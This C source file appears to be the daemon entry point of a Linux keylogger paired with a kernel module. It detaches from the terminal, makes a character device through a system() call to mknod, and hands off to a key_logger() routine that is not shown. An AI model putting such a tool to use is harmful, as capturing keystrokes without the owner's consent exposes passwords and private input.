#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <linux/kdev_t.h>
#include "kdae_handler.h"
#include "config.h"
#include "key_logger.h"
#include "kdae_fd.h"

int fd_arr[ALL_FD_SIZE] = {-1,};

/* make this program as a daemon */
inline void make_daemon(void)
{
	pid_t pid;

	pid=fork();
	if(pid<0)
		error_handler("fork() error\n");
	else if(pid!=0)
		exit(0);  // parent process normal terminate

	signal(SIGHUP, SIG_IGN);
	close(0);  // standard input close
	close(1);  // standard output close
#ifndef DEBUG_MODE
	close(2);  // standard error output close
#endif

	setsid();
}


/* file lock function */
void file_lock(int argc)
{
	int fd;

	if(access(LOCK_FILE, F_OK)==0)
	{
		fputs(FILENAME " already running", stderr);
		if(argc!=2)
			putchar('\n');  // normal run code
		exit(1);
	}
	if(access(PROC_FILE, F_OK)<0)
	{
		fputs("module is not ready", stderr);
		if(argc!=2)
			putchar('\n');  // normal run code
		exit(1);
	}
	fd = creat(LOCK_FILE, 0644);
	if(fd<0)
	{
		fputs(FILENAME " already running", stderr);
		if(argc!=2)
			putchar('\n');  // normal run code
		exit(1);
	}
	close(fd);
}


/* make character device */
void make_char_dev(void)
{
	int ret;

	ret = access(CHAR_DEV, F_OK);
	if(ret==-1)  // if character device does not exist
	{
		/*
		if(mknod(CHAR_DEV, 0600|S_IFCHR, MKDEV(CHAR_DEV_MAJOR, CHAR_DEV_MINOR))<0)
			error_handler("mknod() error\n");
		*/
		system("/bin/mknod " CHAR_DEV " c 240 0");
	}
	else if(ret<-1)
	{
		error_handler("access() error\n");
	}
}


/* kill and segmentation fault signal registration function */
void signal_register(void)
{
	signal(SIGTERM, termination_handler);  // kill signal registration
	signal(SIGSEGV, termination_handler);  // segmentation fault signal registration
}


int main(int argc, char * argv[])
{
#ifdef DEBUG_MODE
	file_lock(argc);
#endif
	make_daemon();
	signal_register();
	make_char_dev();
	key_logger();
	return 0;
}
